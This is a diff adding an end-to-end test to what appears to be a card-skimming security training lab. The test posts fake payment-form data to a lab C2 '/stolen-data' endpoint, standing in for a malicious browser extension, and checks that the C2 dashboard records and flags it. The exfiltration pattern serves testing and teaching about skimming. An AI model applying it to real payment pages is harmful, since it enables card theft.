@@ -78,6 +78,76 @@ dashboardTests('C2 Dashboard Display', () => {
     expect(matchFound, `Expected a dashboard record containing CVV=${cvv} but none found in ${count} records`).toBe(true)
   })
 
+  test('Lab 3: C2 dashboard records extension-captured session with card data', async ({ page }) => {
+    const cvv = String(Math.floor(Math.random() * 900) + 100)
+    const sessionId = `test-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
+    console.log(`\n🔌 Lab 3 test CVV: ${cvv}, sessionId: ${sessionId}`)
+
+    // ── 1. POST test data simulating what the malicious extension would send ─────
+    // Browser extensions cannot be loaded in headless Playwright, so we POST
+    // directly to the C2 endpoint to simulate extension-captured form data.
+    await skipIfAuthRedirect(page, 'Lab 3 C2 pre-check')
+    const c2Url = currentEnv.lab3.c2  // /lab3/extension
+    const response = await page.request.post(`${c2Url}/stolen-data`, {
+      headers: { 'Content-Type': 'application/json' },
+      data: {
+        sessionId,
+        url: `${currentEnv.lab3.vulnerable}/`,
+        timestamp: new Date().toISOString(),
+        // Server's lab3AnalyzePayload iterates payload.data[].{type,data}
+        data: [
+          {
+            type: 'form_submission',
+            data: {
+              formId: 'payment-form',
+              fields: [
+                { name: 'cardNumber', value: '4242424242424242', type: 'text' },
+                { name: 'cvv',        value: cvv,                type: 'text' },
+                { name: 'expiryMonth', value: '12',             type: 'select' },
+                { name: 'expiryYear',  value: '2028',           type: 'select' },
+                { name: 'cardholderName', value: 'Test User',   type: 'text' }
+              ]
+            }
+          }
+        ]
+      }
+    })
+    expect(response.ok(), `POST to ${c2Url}/stolen-data failed: ${response.status()}`).toBeTruthy()
+    console.log(`📤 Posted extension session to C2`)
+
+    // ── 2. Verify session appears in the API ───────────────────────────────────
+    const apiResponse = await page.request.get(`${c2Url}/api/data`)
+    expect(apiResponse.ok()).toBeTruthy()
+    const apiData = await apiResponse.json()
+
+    expect(apiData.stats.totalSessions).toBeGreaterThan(0)
+    console.log(`📊 Total sessions: ${apiData.stats.totalSessions}`)
+
+    const matchedEntry = apiData.data.find(e => e.payload?.sessionId === sessionId)
+    expect(matchedEntry, `Expected sessionId ${sessionId} in API data but not found`).toBeTruthy()
+
+    // Skimmer must have flagged the card number as sensitive
+    expect(matchedEntry.analysis.sensitiveFieldCount).toBeGreaterThan(0)
+    console.log(`✅ Session recorded with ${matchedEntry.analysis.sensitiveFieldCount} sensitive fields`)
+
+    // ── 3. Navigate to C2 dashboard ───────────────────────────────────────────
+    await page.goto(c2Url)
+    await page.waitForLoadState('networkidle')
+    await skipIfAuthRedirect(page, 'Lab 3 C2')
+
+    // ── 4. Dashboard shows session stats ──────────────────────────────────────
+    await expect(page.locator('body')).toContainText('Total Sessions:')
+    const bodyText = await page.locator('body').textContent() || ''
+    const sessionMatch = bodyText.match(/Total Sessions:\s*(\d+)/)
+    const totalShown = parseInt(sessionMatch?.[1] || '0', 10)
+    expect(totalShown).toBeGreaterThan(0)
+    console.log(`📊 Dashboard shows ${totalShown} total sessions`)
+
+    // Recent sessions table must be visible
+    await expect(page.locator('table').first()).toBeVisible()
+    console.log(`✅ Lab 3 C2 dashboard verified`)
+  })
+
   test('Lab 2: C2 dashboard shows masked card from DOM skimmer capture', async ({ page }) => {
     const cvv = String(Math.floor(Math.random() * 900) + 100)
     const cardHolder = 'Jane Test'
